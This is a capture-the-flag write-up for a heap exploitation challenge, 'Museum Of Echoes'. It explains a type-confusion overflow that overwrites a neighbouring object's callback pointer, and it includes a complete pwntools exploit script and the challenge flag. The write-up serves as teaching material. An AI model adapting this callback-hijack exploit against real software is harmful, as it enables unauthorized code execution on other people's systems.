# Museum Of Echoes

## Meta

- Category: pwn
- Target: `10.112.0.12:48353`
- Binary: `museum_of_echoes`
- Flag: `grodno{0f097452-9735-4d96-82d2-f1b33ffda9cd}`

## Summary

The program stores exhibit objects in adjacent heap chunks. A whisper exhibit can be reclassified as a chorus exhibit without reallocating the object, so the later chorus rewrite writes a larger refrain field into memory that originally belonged to a smaller whisper object. That overflow reaches the next exhibit's metadata and callback pointer.

Inspecting an exhibit leaks its callback pointer, giving the code base. On the remote service the deployment build has shorter functions than the downloadable PIE, so the exploit also leaks `chorus_perform` and uses the observed remote spacing to compute `grand_finale`.

## Steps

1. Create two whisper exhibits in adjacent slots.
2. Inspect slot `1` to leak `whisper_perform`.
3. Reclassify slot `0` to chorus, then inspect it to leak `chorus_perform`.
4. Rewrite slot `0` as a chorus. Its refrain overflows into slot `1` and overwrites:
   - kind: whisper
   - room magic: `0x4543484f`
   - perform callback: `grand_finale`
5. Perform slot `1` to call `grand_finale` and print the flag.

## Exploit

```python
#!/usr/bin/env python3
import os
from pwn import *

context.binary = exe = ELF('./museum_of_echoes', checksec=False)

HOST = os.getenv('HOST', '10.112.0.12')
PORT = int(os.getenv('PORT', '48353'))
ROOM_MAGIC = 0x4543484f

io = remote(HOST, PORT) if args.REMOTE else process([exe.path])

def menu(choice):
    io.sendlineafter(b'> ', str(choice).encode())

def create_whisper(slot, line=b'A'):
    menu(1)
    io.sendlineafter(b'Slot:\n', str(slot).encode())
    io.sendlineafter(b'Kind (1=whisper, 2=chorus):\n', b'1')
    io.sendafter(b'Line:\n', line + b'\n')

def inspect(slot):
    menu(4)
    io.sendlineafter(b'Slot:\n', str(slot).encode())
    io.recvuntil(b'Routine: ')
    return int(io.recvline().strip(), 16)

def reclassify(slot, kind):
    menu(3)
    io.sendlineafter(b'Slot:\n', str(slot).encode())
    io.sendlineafter(b'New kind (1=whisper, 2=chorus):\n', str(kind).encode())

def rewrite_chorus(slot, intro, refrain):
    menu(2)
    io.sendlineafter(b'Slot:\n', str(slot).encode())
    io.sendafter(b'New intro:\n', intro)
    io.sendafter(b'New refrain:\n', refrain)

def perform(slot):
    menu(5)
    io.sendlineafter(b'Slot:\n', str(slot).encode())

create_whisper(0, b'A')
create_whisper(1, b'B')
whisper = inspect(1)

reclassify(0, 2)
chorus = inspect(0)

chorus_to_grand = exe.sym['grand_finale'] - exe.sym['chorus_perform']
if chorus - whisper == 0x35:
    chorus_to_grand = 0x3d
grand = chorus + chorus_to_grand

refrain = flat(
    p64(0),
    p64(0x61),
    p32(1),
    p32(0),
    p64(ROOM_MAGIC),
    p64(grand),
).ljust(0x5f, b'R')

rewrite_chorus(0, b'I' * 0x1f, refrain)
perform(1)

print(io.recvall(timeout=2).decode('latin1'), end='')
```
